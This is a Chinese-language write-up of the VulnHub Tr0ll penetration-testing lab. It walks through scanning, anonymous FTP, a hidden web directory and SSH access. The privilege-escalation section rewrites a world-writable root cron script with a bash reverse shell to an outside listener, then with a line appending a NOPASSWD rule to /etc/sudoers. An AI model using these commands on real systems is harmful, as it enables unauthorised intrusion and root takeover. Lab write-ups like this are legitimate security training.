# 靶机信息
Tr0ll是vulnhub中的一台简单类型的渗透测试靶机

# 靶机初始枚举
tcp端口扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Tr0ll]
└─$ sudo nmap -sV -p21,22,80 -O 192.168.218.194 -oA nmapScan/detail
[sudo] kali 的密码：
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 08:53 EDT
Nmap scan report for 192.168.218.194
Host is up (0.00030s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 00:0C:29:9B:9A:2D (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.82 seconds
```
漏洞扫描
```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/Tr0ll/nmapScan]
└─$ sudo nmap -p21,22,80 --script=vuln 192.168.218.194 -oA vuln         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 09:06 EDT
Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.97% done; ETC: 09:07 (0:00:00 remaining)
Nmap scan report for 192.168.218.194
Host is up (0.00028s latency).

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /robots.txt: Robots file
|_  /secret/: Potentially interesting folder
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
MAC Address: 00:0C:29:9B:9A:2D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 320.81 seconds
```


# FTP端口利用
anonymous匿名登录
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Tr0ll]
└─$ ftp 192.168.218.194  
Connected to 192.168.218.194.
220 (vsFTPd 3.0.2)
Name (192.168.218.194:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||53075|).
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
226 Directory send OK.
ftp> binary
200 Switching to Binary mode.
ftp> get lol.pcap
local: lol.pcap remote: lol.pcap
229 Entering Extended Passive Mode (|||5315|).
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
100% |*******************************************************************************************************************************************************|  8068      159.72 KiB/s    00:00 ETA
226 Transfer complete.
8068 bytes received in 00:00 (158.57 KiB/s)
ftp> 
```
有一个 .pcap 文件，get下来审计。
文件是一个 ftp 交互信息，传输了一个文件，好像包含的一个字符串 **sup3rs3cr3tdirlol** 翻译是超级秘密目录
>Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P\n
>\n
>Sucks, you were so close... gotta TRY HARDER!\n

<img width="1603" height="773" alt="Image" src="https://github.com/user-attachments/assets/8321ffdd-686a-4c31-ae18-0b55e4ba0943" />


# WEB枚举
扫描到一个目录

<img width="1917" height="742" alt="Image" src="https://github.com/user-attachments/assets/b8570f25-8fad-4c60-baec-f400e20d7003" />

以及上面隐藏目录的下载可执行文件 **roflmao** 调试一下程序
```
(gdb) run
Starting program: /home/kali/RedteamStu/stageOne/writeup/vulnhub/Tr0ll/roflmao 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Find address 0x0856BF to proceed[Inferior 1 (process 68719) exited with code 040]
(gdb) 
```
输出了一个信息 **Find address 0x0856BF to proceed**
我还一直以为是内存地址，卡了一会之后在url上试了一下。有新东西

<img width="1919" height="519" alt="Image" src="https://github.com/user-attachments/assets/70b33254-649d-4aa4-a230-ca95114b40b3" />

有两个文件，一个列表，一个密码。直接ssh登录，这里实在是想不到密码是文件名。
`[22][ssh] host: 192.168.218.194   login: overflow   password: Pass.txt`

刚登陆上去，结果
```
overflow@troll:/$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
overflow@troll:/$ cat /etc/shadow
cat: /etc/shadow: Permission denied
overflow@troll:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
troll:x:1000:1000:Tr0ll,,,:/home/troll:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:104:112:ftp daemon,,,:/srv/ftp:/bin/false
lololol:x:1001:1001::/home/lololol:
overflow:x:1002:1002::/home/overflow:
ps-aux:x:1003:1003::/home/ps-aux:
maleus:x:1004:1004::/home/maleus:
felux:x:1005:1005::/home/felux:
Eagle11:x:1006:1006::/home/Eagle11:
genphlux:x:1007:1007::/home/genphlux:
usmc8892:x:1008:1008::/home/usmc8892:
blawrg:x:1009:1009::/home/blawrg:
wytshadow:x:1010:1010::/home/wytshadow:
vis1t0r:x:1011:1011::/home/vis1t0r:
                                                                               
Broadcast Message from root@trol                                               
        (somewhere) at 8:30 ...                                                
                                                                               
TIMES UP LOL!                                                                  
                                                                               
Connection to 192.168.218.194 closed by remote host.
Connection to 192.168.218.194 closed.
```
竟然有时间限制，最后有提示。然后就又卡住了，没想到是定时任务相关。
```
overflow@troll:/$ find / -name *cron* 2>/dev/null
/usr/sbin/cron
/usr/share/vim/vim74/syntax/crontab.vim
/usr/share/man/man1/crontab.1.gz
/usr/share/man/man8/cron.8.gz
/usr/share/man/man5/crontab.5.gz
/usr/share/doc/python-debian/examples/debfile/extract_cron
/usr/share/doc/passwd/examples/passwd.expire.cron
/usr/share/doc/cron
/usr/share/doc/cron/examples/cron-stats.pl
/usr/share/doc/cron/examples/crontab2english.pl
/usr/share/doc/cron/examples/cron-tasks-review.sh
/usr/share/doc/cron/README.anacron
/usr/share/bug/cron
/usr/share/bash-completion/completions/crontab
/usr/src/linux-headers-3.13.0-32-generic/include/config/hid/zydacron.h
/usr/src/linux-headers-3.13.0-32-generic/include/config/pata/jmicron.h
/usr/src/linux-headers-3.13.0-32-generic/include/config/memstick/jmicron
/usr/bin/crontab
/run/crond.reboot
/run/crond.pid
/etc/init.d/cron
/etc/cron.d
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.daily
/etc/init/cron.conf
/etc/default/cron
/etc/crontab
/etc/pam.d/cron
/etc/cron.weekly
/var/spool/cron
/var/spool/cron/crontabs
/var/log/cronlog
/var/lib/dpkg/info/cron.conffiles
/var/lib/dpkg/info/cron.preinst
/var/lib/dpkg/info/cron.prerm
/var/lib/dpkg/info/cron.postinst
/var/lib/dpkg/info/cron.postrm
/var/lib/dpkg/info/cron.list
/var/lib/dpkg/info/cron.md5sums
/lib/modules/3.13.0-32-generic/kernel/drivers/hid/hid-zydacron.ko
/lib/modules/3.13.0-32-generic/kernel/drivers/ata/pata_jmicron.ko
overflow@troll:/$ cat /var/log/cronlog 
*/2 * * * * cleaner.py
overflow@troll:/$ find / -name cleaner.py 2>/dev/null
/lib/log/cleaner.py
overflow@troll:/$ 
```

找到一个有用的文件

# 提权
看一下刚刚查找到的定时任务文件
```
overflow@troll:/$ ls -la /lib/log/cleaner.py
-rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
overflow@troll:/$ cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
overflow@troll:/$ 
```
权限 777 所以提权就比较简单
可以写 sudo 文件，拿反向shell等待很多提权姿势。
```
overflow@troll:/$ cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('bash -i >& /dev/tcp/192.168.218.148/4444 0>&1')
except:
        sys.exit()
overflow@troll:/$ 
```
开启监听等待两分钟即可，不知道为什不行。
试试sudoers文件

```
overflow@troll:/$ ls -la /lib/log/cleaner.py
-rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
overflow@troll:/$ cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('echo "overflow ALL=(ALL)NOPASSWD: ALL" >> /etc/sudoers ')
except:
        sys.exit()
overflow@troll:/$ 
```

```
overflow@troll:/$ sudo -l
sudo: unable to resolve host troll
Matching Defaults entries for overflow on troll:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User overflow may run the following commands on troll:
    (ALL) NOPASSWD: ALL
overflow@troll:/$ sudo /bin/bash
sudo: unable to resolve host troll
root@troll:/# whoami
root
root@troll:/# id
uid=0(root) gid=0(root) groups=0(root)
root@troll:/# 
```

提权成功
# 反思
这个靶机有非常多迷惑人的地方，以及不知道如何利用的提示，但是其实不难，就是迷惑人。